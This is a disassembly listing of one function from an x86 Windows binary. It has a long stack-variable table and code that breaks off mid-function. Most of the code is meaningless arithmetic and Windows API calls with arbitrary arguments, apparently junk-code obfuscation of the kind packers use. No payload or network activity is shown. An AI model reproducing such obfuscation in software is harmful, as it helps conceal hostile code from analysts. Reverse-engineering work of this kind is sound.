var_CA0		= qword	ptr -0CA0h
var_C98		= qword	ptr -0C98h
var_C90		= qword	ptr -0C90h
var_C88		= qword	ptr -0C88h
var_C80		= qword	ptr -0C80h
var_C78		= qword	ptr -0C78h
var_C70		= qword	ptr -0C70h
var_C68		= qword	ptr -0C68h
var_C60		= qword	ptr -0C60h
var_C58		= qword	ptr -0C58h
var_C50		= qword	ptr -0C50h
var_C48		= qword	ptr -0C48h
var_C40		= qword	ptr -0C40h
var_C38		= qword	ptr -0C38h
var_C30		= qword	ptr -0C30h
var_C28		= qword	ptr -0C28h
var_C20		= qword	ptr -0C20h
var_C18		= qword	ptr -0C18h
var_C10		= qword	ptr -0C10h
var_C08		= qword	ptr -0C08h
var_C00		= qword	ptr -0C00h
var_BF8		= qword	ptr -0BF8h
var_BF0		= qword	ptr -0BF0h
var_BE8		= qword	ptr -0BE8h
var_BE0		= qword	ptr -0BE0h
var_BD8		= qword	ptr -0BD8h
var_BD0		= qword	ptr -0BD0h
var_BC8		= qword	ptr -0BC8h
var_BC0		= qword	ptr -0BC0h
var_BB8		= qword	ptr -0BB8h
var_BB0		= qword	ptr -0BB0h
var_BA8		= qword	ptr -0BA8h
var_BA0		= qword	ptr -0BA0h
var_B98		= qword	ptr -0B98h
var_B90		= qword	ptr -0B90h
var_B88		= qword	ptr -0B88h
var_B80		= qword	ptr -0B80h
var_B78		= qword	ptr -0B78h
var_B70		= qword	ptr -0B70h
var_B68		= qword	ptr -0B68h
var_B60		= qword	ptr -0B60h
var_B58		= qword	ptr -0B58h
var_B50		= qword	ptr -0B50h
var_B48		= qword	ptr -0B48h
var_B40		= qword	ptr -0B40h
var_B38		= qword	ptr -0B38h
var_B30		= qword	ptr -0B30h
var_B28		= qword	ptr -0B28h
var_B20		= qword	ptr -0B20h
var_B18		= qword	ptr -0B18h
var_B10		= qword	ptr -0B10h
var_B08		= qword	ptr -0B08h
var_B00		= qword	ptr -0B00h
var_AF8		= qword	ptr -0AF8h
var_AF0		= qword	ptr -0AF0h
var_AE8		= qword	ptr -0AE8h
var_AE0		= qword	ptr -0AE0h
var_AD8		= qword	ptr -0AD8h
var_AD0		= qword	ptr -0AD0h
var_AC8		= qword	ptr -0AC8h
var_AC0		= qword	ptr -0AC0h
var_AB8		= qword	ptr -0AB8h
var_AB0		= qword	ptr -0AB0h
var_AA8		= qword	ptr -0AA8h
var_AA0		= qword	ptr -0AA0h
var_A98		= qword	ptr -0A98h
var_A90		= qword	ptr -0A90h
var_A88		= qword	ptr -0A88h
var_A80		= qword	ptr -0A80h
var_A78		= qword	ptr -0A78h
var_A70		= qword	ptr -0A70h
var_A68		= qword	ptr -0A68h
var_A60		= qword	ptr -0A60h
var_A58		= qword	ptr -0A58h
var_A50		= qword	ptr -0A50h
var_A48		= qword	ptr -0A48h
var_A40		= qword	ptr -0A40h
var_A38		= qword	ptr -0A38h
var_A30		= qword	ptr -0A30h
var_A28		= qword	ptr -0A28h
var_A20		= qword	ptr -0A20h
var_A18		= qword	ptr -0A18h
var_A10		= qword	ptr -0A10h
var_A08		= qword	ptr -0A08h
var_A00		= qword	ptr -0A00h
var_9F8		= qword	ptr -9F8h
var_9F0		= qword	ptr -9F0h
var_9E8		= qword	ptr -9E8h
var_9E0		= qword	ptr -9E0h
var_9D8		= qword	ptr -9D8h
var_9D0		= qword	ptr -9D0h
var_9C8		= qword	ptr -9C8h
var_9C0		= qword	ptr -9C0h
var_9B8		= qword	ptr -9B8h
var_9B0		= qword	ptr -9B0h
var_9A8		= qword	ptr -9A8h
var_9A0		= qword	ptr -9A0h
var_998		= qword	ptr -998h
var_990		= qword	ptr -990h
var_988		= qword	ptr -988h
var_980		= qword	ptr -980h
var_978		= qword	ptr -978h
var_970		= qword	ptr -970h
var_968		= qword	ptr -968h
var_960		= qword	ptr -960h
var_958		= qword	ptr -958h
var_950		= qword	ptr -950h
var_948		= qword	ptr -948h
var_940		= qword	ptr -940h
var_938		= qword	ptr -938h
var_930		= qword	ptr -930h
var_928		= qword	ptr -928h
var_920		= qword	ptr -920h
var_918		= qword	ptr -918h
var_910		= qword	ptr -910h
var_908		= qword	ptr -908h
var_900		= qword	ptr -900h
var_8F8		= qword	ptr -8F8h
var_8F0		= qword	ptr -8F0h
var_8E8		= qword	ptr -8E8h
var_8E0		= qword	ptr -8E0h
var_8D8		= qword	ptr -8D8h
var_8D0		= qword	ptr -8D0h
var_8C8		= qword	ptr -8C8h
var_8C0		= qword	ptr -8C0h
var_8B8		= qword	ptr -8B8h
var_8B0		= qword	ptr -8B0h
var_8A8		= qword	ptr -8A8h
var_8A0		= qword	ptr -8A0h
var_898		= qword	ptr -898h
var_890		= qword	ptr -890h
var_888		= qword	ptr -888h
var_880		= qword	ptr -880h
var_878		= qword	ptr -878h
var_870		= qword	ptr -870h
var_868		= qword	ptr -868h
var_860		= qword	ptr -860h
var_858		= qword	ptr -858h
var_850		= qword	ptr -850h
var_848		= qword	ptr -848h
var_840		= qword	ptr -840h
var_838		= qword	ptr -838h
var_830		= qword	ptr -830h
var_828		= qword	ptr -828h
var_820		= qword	ptr -820h
var_818		= qword	ptr -818h
var_810		= qword	ptr -810h
var_808		= qword	ptr -808h
var_800		= qword	ptr -800h
var_7F8		= qword	ptr -7F8h
var_7F0		= qword	ptr -7F0h
var_7E8		= qword	ptr -7E8h
var_7E0		= qword	ptr -7E0h
var_7D8		= qword	ptr -7D8h
var_7D0		= qword	ptr -7D0h
var_7C8		= qword	ptr -7C8h
var_7C0		= qword	ptr -7C0h
var_7B8		= qword	ptr -7B8h
var_7B0		= qword	ptr -7B0h
var_7A8		= qword	ptr -7A8h
var_7A0		= qword	ptr -7A0h
var_798		= qword	ptr -798h
var_790		= qword	ptr -790h
var_788		= qword	ptr -788h
var_780		= qword	ptr -780h
var_778		= qword	ptr -778h
var_770		= qword	ptr -770h
var_768		= qword	ptr -768h
var_760		= qword	ptr -760h
var_758		= qword	ptr -758h
var_750		= qword	ptr -750h
var_748		= qword	ptr -748h
var_740		= qword	ptr -740h
var_738		= qword	ptr -738h
var_730		= qword	ptr -730h
var_728		= qword	ptr -728h
var_720		= qword	ptr -720h
var_718		= qword	ptr -718h
var_710		= qword	ptr -710h
var_708		= qword	ptr -708h
var_700		= qword	ptr -700h
var_6F8		= qword	ptr -6F8h
var_6F0		= qword	ptr -6F0h
var_6E8		= qword	ptr -6E8h
var_6E0		= qword	ptr -6E0h
var_6D8		= qword	ptr -6D8h
var_6D0		= qword	ptr -6D0h
var_6C8		= qword	ptr -6C8h
var_6C0		= qword	ptr -6C0h
var_6B8		= qword	ptr -6B8h
var_6B0		= qword	ptr -6B0h
var_6A8		= qword	ptr -6A8h
var_6A0		= qword	ptr -6A0h
var_698		= qword	ptr -698h
var_690		= qword	ptr -690h
var_688		= qword	ptr -688h
var_680		= qword	ptr -680h
var_678		= qword	ptr -678h
var_670		= qword	ptr -670h
var_668		= qword	ptr -668h
var_660		= qword	ptr -660h
var_658		= qword	ptr -658h
var_650		= qword	ptr -650h
var_648		= qword	ptr -648h
var_640		= qword	ptr -640h
var_638		= qword	ptr -638h
var_630		= qword	ptr -630h
var_628		= qword	ptr -628h
var_620		= qword	ptr -620h
var_618		= qword	ptr -618h
var_610		= qword	ptr -610h
var_608		= qword	ptr -608h
var_600		= qword	ptr -600h
var_5F8		= qword	ptr -5F8h
var_5F0		= qword	ptr -5F0h
var_5E8		= qword	ptr -5E8h
var_5E0		= qword	ptr -5E0h
var_5D8		= qword	ptr -5D8h
var_5D0		= qword	ptr -5D0h
var_5C8		= qword	ptr -5C8h
var_5C0		= qword	ptr -5C0h
var_5B8		= qword	ptr -5B8h
var_5B0		= qword	ptr -5B0h
var_5A8		= qword	ptr -5A8h
var_5A0		= qword	ptr -5A0h
var_598		= qword	ptr -598h
var_590		= qword	ptr -590h
var_588		= qword	ptr -588h
var_580		= qword	ptr -580h
var_578		= qword	ptr -578h
var_570		= qword	ptr -570h
var_568		= qword	ptr -568h
var_560		= qword	ptr -560h
var_558		= qword	ptr -558h
var_550		= qword	ptr -550h
var_548		= qword	ptr -548h
var_540		= qword	ptr -540h
var_538		= qword	ptr -538h
var_530		= qword	ptr -530h
var_528		= qword	ptr -528h
var_520		= qword	ptr -520h
var_518		= qword	ptr -518h
var_510		= qword	ptr -510h
var_508		= qword	ptr -508h
var_500		= qword	ptr -500h
var_4F8		= qword	ptr -4F8h
var_4F0		= qword	ptr -4F0h
var_4E8		= qword	ptr -4E8h
var_4E0		= qword	ptr -4E0h
var_4D8		= qword	ptr -4D8h
var_4D0		= qword	ptr -4D0h
var_4C8		= qword	ptr -4C8h
var_4C0		= qword	ptr -4C0h
var_4B8		= qword	ptr -4B8h
var_4B0		= qword	ptr -4B0h
var_4A8		= qword	ptr -4A8h
var_4A0		= qword	ptr -4A0h
var_498		= qword	ptr -498h
var_490		= qword	ptr -490h
var_488		= qword	ptr -488h
var_480		= qword	ptr -480h
var_478		= qword	ptr -478h
var_470		= qword	ptr -470h
var_468		= qword	ptr -468h
var_460		= qword	ptr -460h
var_458		= qword	ptr -458h
var_450		= qword	ptr -450h
var_448		= qword	ptr -448h
var_440		= qword	ptr -440h
var_438		= qword	ptr -438h
var_430		= qword	ptr -430h
var_428		= qword	ptr -428h
var_420		= qword	ptr -420h
var_418		= qword	ptr -418h
var_410		= qword	ptr -410h
var_408		= qword	ptr -408h
var_400		= qword	ptr -400h
var_3F8		= qword	ptr -3F8h
var_3F0		= qword	ptr -3F0h
var_3E8		= qword	ptr -3E8h
var_3E0		= qword	ptr -3E0h
var_3D8		= qword	ptr -3D8h
var_3D0		= qword	ptr -3D0h
var_3C8		= qword	ptr -3C8h
var_3C0		= qword	ptr -3C0h
var_3B8		= qword	ptr -3B8h
var_3B0		= qword	ptr -3B0h
var_3A8		= qword	ptr -3A8h
var_3A0		= qword	ptr -3A0h
var_398		= qword	ptr -398h
var_390		= qword	ptr -390h
var_388		= qword	ptr -388h
var_380		= qword	ptr -380h
var_378		= qword	ptr -378h
var_370		= qword	ptr -370h
var_368		= qword	ptr -368h
var_360		= qword	ptr -360h
var_358		= qword	ptr -358h
var_350		= qword	ptr -350h
var_348		= qword	ptr -348h
var_340		= qword	ptr -340h
var_338		= qword	ptr -338h
var_330		= qword	ptr -330h
var_328		= qword	ptr -328h
var_320		= qword	ptr -320h
var_318		= qword	ptr -318h
var_310		= qword	ptr -310h
var_308		= qword	ptr -308h
var_300		= qword	ptr -300h
var_2F8		= qword	ptr -2F8h
var_2F0		= qword	ptr -2F0h
var_2E8		= qword	ptr -2E8h
var_2E0		= qword	ptr -2E0h
var_2D8		= qword	ptr -2D8h
var_2D0		= qword	ptr -2D0h
var_2C8		= qword	ptr -2C8h
var_2C0		= qword	ptr -2C0h
var_2B8		= qword	ptr -2B8h
var_2B0		= qword	ptr -2B0h
var_2A8		= qword	ptr -2A8h
var_2A0		= qword	ptr -2A0h
var_298		= qword	ptr -298h
var_290		= qword	ptr -290h
var_288		= qword	ptr -288h
var_280		= qword	ptr -280h
var_278		= dword	ptr -278h
var_274		= dword	ptr -274h
pvOut		= dword	ptr -270h
var_269		= byte ptr -269h
var_268		= dword	ptr -268h
var_264		= word ptr -264h
var_260		= word ptr -260h
var_25C		= dword	ptr -25Ch
var_258		= dword	ptr -258h
var_254		= word ptr -254h
var_250		= word ptr -250h
var_24C		= word ptr -24Ch
var_238		= dword	ptr -238h
var_234		= dword	ptr -234h
var_22C		= dword	ptr -22Ch
var_228		= dword	ptr -228h
var_220		= dword	ptr -220h
var_218		= dword	ptr -218h
var_204		= dword	ptr -204h
var_1FC		= dword	ptr -1FCh
var_1F8		= dword	ptr -1F8h
var_1D8		= word ptr -1D8h
var_1D1		= byte ptr -1D1h
var_1D0		= dword	ptr -1D0h
var_1CC		= word ptr -1CCh
var_1C5		= byte ptr -1C5h
var_1C4		= word ptr -1C4h
var_1C0		= dword	ptr -1C0h
var_1BC		= word ptr -1BCh
hdc		= dword	ptr -1B4h
var_1B0		= word ptr -1B0h
var_1A8		= word ptr -1A8h
var_1A4		= word ptr -1A4h
var_194		= dword	ptr -194h
var_18C		= dword	ptr -18Ch
var_188		= dword	ptr -188h
var_174		= dword	ptr -174h
var_148		= dword	ptr -148h
var_140		= dword	ptr -140h
var_136		= byte ptr -136h
var_135		= byte ptr -135h
var_134		= word ptr -134h
var_130		= dword	ptr -130h
var_12C		= word ptr -12Ch
var_125		= byte ptr -125h
pvIn		= dword	ptr -124h
var_11E		= byte ptr -11Eh
var_11D		= byte ptr -11Dh
var_11C		= word ptr -11Ch
var_118		= word ptr -118h
var_114		= dword	ptr -114h
var_105		= byte ptr -105h
var_104		= dword	ptr -104h
wFirst		= dword	ptr -100h
var_FC		= dword	ptr -0FCh
top		= dword	ptr -0F8h
var_F1		= byte ptr -0F1h
var_F0		= word ptr -0F0h
var_EC		= word ptr -0ECh
var_E8		= word ptr -0E8h
var_E4		= dword	ptr -0E4h
var_DC		= word ptr -0DCh
var_D5		= byte ptr -0D5h
var_D4		= word ptr -0D4h
var_D0		= dword	ptr -0D0h
var_CC		= word ptr -0CCh
var_C8		= dword	ptr -0C8h
var_C0		= word ptr -0C0h
var_BC		= dword	ptr -0BCh
var_B8		= dword	ptr -0B8h
var_AC		= dword	ptr -0ACh
pgui		= dword	ptr -0A8h
var_A4		= dword	ptr -0A4h
var_A0		= dword	ptr -0A0h
var_99		= byte ptr -99h
var_98		= word ptr -98h
var_94		= dword	ptr -94h
var_88		= dword	ptr -88h
var_78		= dword	ptr -78h
var_5C		= dword	ptr -5Ch
var_44		= dword	ptr -44h
var_38		= dword	ptr -38h
var_23		= byte ptr -23h
var_22		= byte ptr -22h
var_21		= byte ptr -21h
var_20		= word ptr -20h
var_1C		= word ptr -1Ch
var_18		= dword	ptr -18h
var_14		= word ptr -14h
var_10		= dword	ptr -10h
hemf		= dword	ptr -0Ch
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		mov	eax, 24B4h
		call	__alloca_probe
		push	ebx
		push	esi
		movzx	eax, [ebp+var_EC]
		mov	ecx, 33h
		sub	ecx, eax
		movzx	edx, [ebp+var_98]
		sub	ecx, edx
		sub	ecx, 41h
		mov	[ebp+var_260], cx
		mov	eax, [ebp+pvIn]
		sub	eax, [ebp+pgui]
		mov	[ebp+var_FC], eax
		movzx	ecx, [ebp+var_D4]
		mov	edx, [ebp+pvIn]
		lea	eax, [edx+ecx+3Fh]
		mov	[ebp+var_4], eax
		movzx	ecx, [ebp+var_12C]
		mov	edx, [ebp+wFirst]
		lea	eax, [edx+ecx+3Ch]
		movzx	ecx, [ebp+var_254]
		sub	ecx, eax
		mov	[ebp+var_254], cx
		movzx	edx, [ebp+var_EC]
		mov	eax, [ebp+var_1D0]
		sub	eax, edx
		add	eax, 5Ch
		sub	eax, [ebp+pgui]
		mov	[ebp+var_118], ax
		movzx	ecx, [ebp+var_6]
		sub	ecx, 25h
		sub	ecx, [ebp+var_4]
		mov	[ebp+var_20], cx
		mov	edx, [ebp+pvIn]
		mov	[ebp+top], edx
		mov	eax, [ebp+pvOut]
		mov	[ebp+var_1F8], eax
		mov	ecx, [ebp+var_FC]
		add	ecx, 54h
		sub	ecx, [ebp+hdc]
		mov	[ebp+var_1D0], ecx
		movzx	edx, [ebp+var_22]
		add	edx, 42h
		mov	[ebp+pvIn], edx
		movzx	eax, [ebp+var_6]
		movzx	ecx, [ebp+var_1C]
		mov	edx, [ebp+var_258]
		lea	ecx, [ecx+edx+36h]
		and	eax, ecx
		mov	[ebp+var_134], ax
		mov	[ebp+var_10], 0
		mov	edx, [ebp+top]
		mov	[ebp+var_2490],	edx
		cmp	[ebp+var_2490],	0
		jz	short loc_409F19
		cmp	[ebp+var_2490],	1
		jz	short loc_409F28
		cmp	[ebp+var_2490],	2
		jz	short loc_409F47
		jmp	short loc_409F62
; ---------------------------------------------------------------------------

loc_409F19:				; CODE XREF: sub_409DF0+113j
		mov	eax, dword_42C048
		sub	eax, 3Bh
		mov	dword_42C048, eax
		jmp	short loc_409F75
; ---------------------------------------------------------------------------

loc_409F28:				; CODE XREF: sub_409DF0+11Cj
		movzx	ecx, [ebp+var_250]
		add	ecx, 8
		and	ecx, 3Dh
		movzx	edx, [ebp+var_135]
		imul	edx, ecx
		mov	[ebp+var_135], dl
		jmp	short loc_409F75
; ---------------------------------------------------------------------------

loc_409F47:				; CODE XREF: sub_409DF0+125j
		mov	eax, [ebp+hemf]
		sub	eax, [ebp+top]
		movzx	ecx, [ebp+var_1BC]
		sub	ecx, eax
		mov	[ebp+var_1BC], cx
		jmp	short loc_409F75
; ---------------------------------------------------------------------------

loc_409F62:				; CODE XREF: sub_409DF0+127j
		movzx	edx, [ebp+var_98]
		sub	edx, [ebp+hdc]
		mov	[ebp+hdc], edx

loc_409F75:				; CODE XREF: sub_409DF0+136j
					; sub_409DF0+155j ...
		mov	[ebp+var_234], 20h
		mov	[ebp+pvOut], 77h
		mov	[ebp+var_C8], 0
		movzx	eax, [ebp+var_1A4]
		movzx	ecx, [ebp+var_250]
		and	eax, ecx
		movzx	edx, [ebp+var_14]
		or	eax, edx
		movzx	ecx, [ebp+var_260]
		or	ecx, eax
		mov	[ebp+var_260], cx
		mov	dl, byte ptr [ebp+wFirst]
		mov	byte ptr [ebp+var_AC], dl
		mov	[ebp+var_22C], 5Fh
		mov	eax, [ebp+hemf]
		and	eax, [ebp+var_FC]
		mov	[ebp+pgui], eax
		mov	ecx, 52h
		sub	ecx, [ebp+pvOut]
		movzx	edx, [ebp+var_F0]
		add	edx, ecx
		mov	[ebp+var_F0], dx
		mov	[ebp+wFirst], 33h
		mov	[ebp+var_1C0], 6Ah
		mov	[ebp+pvIn], 77h
		mov	eax, [ebp+pvIn]
		push	eax
		mov	ecx, [ebp+pgui]
		push	ecx
		mov	edx, [ebp+top]
		push	edx
		mov	eax, [ebp+hdc]
		push	eax
		mov	ecx, [ebp+hdc]
		push	ecx
		mov	edx, [ebp+hemf]
		push	edx
		call	sub_409B10
		add	esp, 18h
		add	eax, 2Bh
		xor	eax, [ebp+pvIn]
		xor	eax, [ebp+var_114]
		mov	[ebp+var_11C], ax
		mov	eax, dword_42C038
		and	eax, 5Eh
		mov	dword_42C038, eax
		movzx	ecx, [ebp+var_269]
		xor	ecx, 40h
		mov	[ebp+var_130], ecx
		movzx	edx, [ebp+var_D4]
		add	edx, dword_42C050
		mov	dword_42C050, edx
		push	31h		; lpABC
		push	45h		; wLast
		mov	eax, [ebp+wFirst]
		push	eax		; wFirst
		mov	ecx, [ebp+hdc]
		push	ecx		; hdc
		call	ds:GetCharABCWidthsW
		mov	edx, 5Bh
		sub	edx, eax
		mov	[ebp+hdc], edx
		mov	[ebp+var_A0], 0
		mov	dword_42C024, 17h
		mov	eax, dword_42C024
		and	eax, 43h
		or	eax, 20h
		mov	[ebp+var_4], eax
		mov	ecx, hProcess
		add	ecx, [ebp+var_268]
		mov	dword_42C024, ecx
		mov	edx, 68h
		sub	edx, [ebp+var_104]
		add	edx, y
		mov	[ebp+var_20], dx
		mov	eax, hdc
		push	eax		; color
		push	56h		; cWidth
		mov	ecx, hProcess
		push	ecx		; iStyle
		call	ds:CreatePen
		add	eax, 42h
		mov	hdc, eax
		mov	dword_42C054, 4Fh
		movzx	edx, [ebp+var_E8]
		movzx	eax, [ebp+var_134]
		add	edx, [ebp+hdc]
		lea	ecx, [eax+edx-0B2h]
		mov	[ebp+var_6], cl
		mov	edx, [ebp+hdc]
		push	edx		; hdc
		call	ds:GetTextCharset
		mov	ecx, 5Ah
		sub	ecx, eax
		mov	[ebp+wFirst], ecx
		mov	edx, [ebp+hdc]
		add	edx, 3Fh
		mov	[ebp+hdc], edx
		movzx	eax, [ebp+var_22]
		mov	ecx, [ebp+var_1C0]
		lea	edx, [eax+ecx+16h]
		sub	edx, [ebp+pgui]
		add	edx, [ebp+pvIn]
		mov	[ebp+var_105], dl
		mov	eax, [ebp+pvOut]
		mov	[ebp+hemf], eax
		mov	ecx, [ebp+wFirst]
		add	ecx, 16h
		mov	[ebp+hdc], ecx
		mov	dx, word ptr [ebp+hemf]
		mov	word ptr [ebp+pvOut], dx
		mov	[ebp+var_238], 2
		mov	eax, [ebp+top]
		or	eax, 1Ch
		mov	[ebp+hemf], eax
		mov	[ebp+var_274], 0
		jmp	short loc_40A1DC
; ---------------------------------------------------------------------------

loc_40A1CD:				; CODE XREF: sub_409DF0+4BCj
		mov	ecx, [ebp+var_274]
		add	ecx, 1
		mov	[ebp+var_274], ecx

loc_40A1DC:				; CODE XREF: sub_409DF0+3DBj
		cmp	[ebp+var_274], 7
		jge	loc_40A2B1
		mov	edx, hdc
		sub	edx, 25h
		and	edx, 61h
		mov	[ebp+var_268], edx
		mov	eax, offset Wow64Process
		sub	eax, 24h
		mov	ecx, [eax]
		mov	lpExitCode, ecx
		movzx	edx, [ebp+var_1C4]
		add	edx, 2Eh
		mov	hProcess, edx
		mov	hProcess, 42h
		mov	esi, 0Ah
		sub	esi, Wow64Process
		movzx	eax, [ebp+var_EC]
		sub	esi, eax
		mov	ecx, Wow64Process
		push	ecx
		mov	edx, dword_42C024
		push	edx
		mov	eax, lpExitCode
		push	eax
		mov	ecx, hProcess
		push	ecx
		call	sub_4103D0
		add	esp, 10h
		add	esi, eax
		mov	[ebp+var_20], si
		movzx	edx, [ebp+var_D5]
		sub	edx, 4Ch
		movzx	eax, [ebp+var_20]
		add	eax, 1Ch
		and	edx, eax
		mov	[ebp+var_260], dx
		movzx	ecx, [ebp+var_CC]
		movzx	edx, [ebp+var_1CC]
		add	ecx, edx
		mov	dword_42C054, ecx
		mov	eax, y
		add	eax, [ebp+var_18]
		sub	eax, lpExitCode
		sub	eax, dword_42C024
		add	eax, 3Ch
		mov	[ebp+var_6], al
		jmp	loc_40A1CD
; ---------------------------------------------------------------------------

loc_40A2B1:				; CODE XREF: sub_409DF0+3F3j
		movzx	ecx, [ebp+var_1A4]
		movzx	edx, [ebp+var_24C]
		lea	eax, [edx+ecx-43h]
		mov	[ebp+var_24C], ax
		mov	ecx, dword_42C024
		add	ecx, 0Ah
		mov	[ebp+var_D4], cx
		mov	edx, 32h
		sub	edx, [ebp+var_268]
		mov	eax, [ebp+top]
		lea	ecx, [edx+eax-5]
		movzx	edx, [ebp+var_1B0]
		xor	ecx, edx
		mov	[ebp+var_105], cl
		movzx	eax, [ebp+var_105]
		add	eax, 5Fh
		xor	eax, 32h
		mov	[ebp+var_21], al
		mov	esi, [ebp+var_94]
		add	esi, [ebp+pvOut]
		mov	ecx, [ebp+pvOut]
		push	ecx		; pvOut
		mov	edx, [ebp+pvIn]
		push	edx		; pvIn
		push	13h		; cjIn
		push	3Ch		; iEscape
		push	0Ch		; hdc
		call	ds:Escape
		add	eax, 32h
		xor	esi, eax
		mov	[ebp+var_20], si
		mov	[ebp+var_A0], 0
		mov	eax, y
		xor	eax, 11h
		mov	dword_42C024, eax
		mov	byte ptr y, 3Ch
		movzx	ecx, [ebp+var_1C5]
		mov	edx, hdc
		lea	eax, [edx+ecx-22h]
		movzx	ecx, [ebp+var_11C]
		sub	eax, ecx
		mov	[ebp+var_98], ax
		mov	edx, 41h
		sub	edx, hProcess
		add	edx, 35h
		sub	edx, dword_42C024
		or	edx, lpExitCode
		mov	[ebp+var_136], dl
		mov	[ebp+var_278], 0
		jmp	short loc_40A3B7
; ---------------------------------------------------------------------------

loc_40A3A8:				; CODE XREF: sub_409DF0+637j
		mov	eax, [ebp+var_278]
		add	eax, 1
		mov	[ebp+var_278], eax

loc_40A3B7:				; CODE XREF: sub_409DF0+5B6j
		cmp	[ebp+var_278], 0Ch
		jge	short loc_40A42C
		mov	ecx, 3Ah
		sub	ecx, [ebp+wFirst]
		mov	[ebp+pgui], ecx
		mov	edx, [ebp+var_AC]
		add	edx, 3Eh
		mov	[ebp+var_FC], edx
		movzx	eax, word ptr [ebp+pvOut]
		mov	[ebp+pvOut], eax
		mov	ecx, [ebp+pvOut]
		mov	[ebp+var_220], ecx
		mov	edx, [ebp+pgui]
		sub	edx, 5
		mov	[ebp+wFirst], edx
		mov	[ebp+var_AC], 5Fh
		mov	eax, [ebp+pgui]
		add	eax, 55h
		and	eax, 2
		or	eax, 1
		mov	[ebp+var_1D1], al
		jmp	loc_40A3A8
; ---------------------------------------------------------------------------

loc_40A42C:				; CODE XREF: sub_409DF0+5CEj
		movzx	ecx, [ebp+var_250]
		movzx	edx, [ebp+var_1B0]
		sub	edx, ecx
		mov	[ebp+var_1B0], dx
		movzx	eax, [ebp+var_11D]
		mov	ecx, [ebp+pvIn]
		sub	ecx, 0Eh
		xor	eax, ecx
		mov	[ebp+var_268], eax
		mov	edx, [ebp+var_258]
		add	edx, [ebp+var_AC]
		mov	[ebp+pvIn], edx

loc_40A46D:				; CODE XREF: sub_409DF0+478Ej
		cmp	[ebp+top], 52h
		jle	short loc_40A4C6
		mov	eax, lpExitCode
		push	eax		; lpExitCode
		mov	ecx, hProcess
		push	ecx		; hThread
		call	ds:GetExitCodeThread
		movzx	edx, [ebp+var_135]
		lea	eax, [eax+edx+27h]
		movzx	ecx, [ebp+var_11C]
		add	eax, ecx
		mov	[ebp+var_98], ax
		mov	edx, [ebp+var_25C]
		sub	edx, [ebp+var_130]
		movzx	eax, [ebp+var_1B0]
		sub	edx, eax
		add	edx, hdc
		mov	[ebp+var_D4], dx

loc_40A4C6:				; CODE XREF: sub_409DF0+684j
		mov	ecx, lpExitCode
		mov	[ebp+var_194], ecx
		movzx	edx, [ebp+var_1C4]
		mov	lpExitCode, edx
		movzx	eax, [ebp+var_1C]
		add	eax, dword_42C024
		sub	eax, hProcess
		mov	[ebp+var_D0], eax
		mov	[ebp+var_247C],	0
		mov	[ebp+var_2480],	29Ah
		push	0		; redraw
		push	0		; lpsi
		push	0		; nBar
		push	0		; hwnd
		call	ds:SetScrollInfo
		sub	ebx, [ebp+var_2480]
		sub	edx, ebx
		movzx	eax, [esp+24BCh+var_24D7]
		sub	ebx, eax
		mov	[ebp+var_247C],	eax
		movzx	ecx, [ebp+var_F0]
		and	ecx, dword_42C024
		mov	hProcess, ecx
		movzx	ebx, [ebp+var_22]
		mov	edx, Wow64Process
		push	edx		; Wow64Process
		mov	eax, hProcess
		push	eax		; hProcess
		call	ds:IsWow64Process
		mov	ecx, Wow64Process
		add	ecx, 7Ah
		and	eax, ecx
		or	ebx, eax
		mov	[ebp+var_11D], bl
		movzx	edx, [ebp+var_98]
		sub	edx, 93h
		sub	edx, hProcess
		mov	[ebp+var_98], dx
		mov	eax, Wow64Process
		sub	eax, 4Dh
		movzx	ecx, [ebp+var_7]
		or	eax, ecx
		mov	[ebp+var_1D8], ax
		movzx	edx, [ebp+var_5]
		mov	eax, hdc
		lea	ecx, [edx+eax-23h]
		xor	ecx, 60h
		mov	[ebp+var_1B0], cx
		movzx	edx, [ebp+var_7]
		movzx	eax, [ebp+var_269]
		lea	ecx, [edx+eax+61h]
		mov	[ebp+var_98], cx
		mov	edx, [ebp+wFirst]
		add	edx, [ebp+hdc]
		mov	[ebp+pvOut], edx
		mov	eax, [ebp+wFirst]
		mov	[ebp+var_2494],	eax
		cmp	[ebp+var_2494],	0
		jz	short loc_40A5F7
		cmp	[ebp+var_2494],	1
		jz	short loc_40A5F9
		jmp	short loc_40A60C
; ---------------------------------------------------------------------------

loc_40A5F7:				; CODE XREF: sub_409DF0+7FAj
		jmp	short loc_40A638
; ---------------------------------------------------------------------------

loc_40A5F9:				; CODE XREF: sub_409DF0+803j
		movzx	ecx, [ebp+var_DC]
		add	ecx, [ebp+hemf]
		mov	[ebp+var_DC], cx
		jmp	short loc_40A638
; ---------------------------------------------------------------------------

loc_40A60C:				; CODE XREF: sub_409DF0+805j
		movzx	edx, [ebp+var_1C4]
		mov	eax, [ebp+var_B8]
		lea	ebx, [eax+edx+4Eh]
		movzx	ecx, [ebp+var_134]
		and	ebx, ecx
		mov	edx, [ebp+var_AC]
		push	edx		; hdc
		call	ds:StrokeAndFillPath
		or	ebx, eax
		mov	[ebp+var_6], bl

loc_40A638:				; CODE XREF: sub_409DF0:loc_40A5F7j
					; sub_409DF0+81Aj
		mov	[ebp+var_140], 15h
		mov	[ebp+pgui], 49h
		mov	eax, [ebp+hdc]
		mov	[ebp+var_2498],	eax
		cmp	[ebp+var_2498],	1
		jz	short loc_40A66E
		cmp	[ebp+var_2498],	2
		jz	short loc_40A68D
		jmp	short loc_40A6A2
; ---------------------------------------------------------------------------
		jmp	short loc_40A6A2
; ---------------------------------------------------------------------------

loc_40A66E:				; CODE XREF: sub_409DF0+86Fj
		mov	ecx, [ebp+hdc]
		cmp	ecx, dword_42C008
		jge	short loc_40A68B
		mov	edx, [ebp+var_114]
		add	edx, 2Ch
		mov	[ebp+hdc], edx

loc_40A68B:				; CODE XREF: sub_409DF0+88Aj
		jmp	short loc_40A6A2
; ---------------------------------------------------------------------------

loc_40A68D:				; CODE XREF: sub_409DF0+878j
		movzx	eax, [ebp+var_1D8]
		mov	ecx, dword_42C03C
		sub	ecx, eax
		mov	dword_42C03C, ecx

loc_40A6A2:				; CODE XREF: sub_409DF0+87Aj
					; sub_409DF0+87Cj ...
		movzx	edx, [ebp+var_1C]
		sub	edx, 1Dh
		mov	[ebp+var_FC], edx
		mov	eax, [ebp+var_4]
		and	eax, 2Dh
		and	eax, [ebp+hemf]
		mov	ecx, [ebp+wFirst]
		sub	ecx, 1
		or	eax, ecx
		mov	[ebp+var_99], al
		movzx	edx, [ebp+var_1D8]
		add	edx, 60h
		xor	edx, 7
		mov	[ebp+var_B8], edx
		mov	eax, [ebp+var_A0]
		add	eax, 1
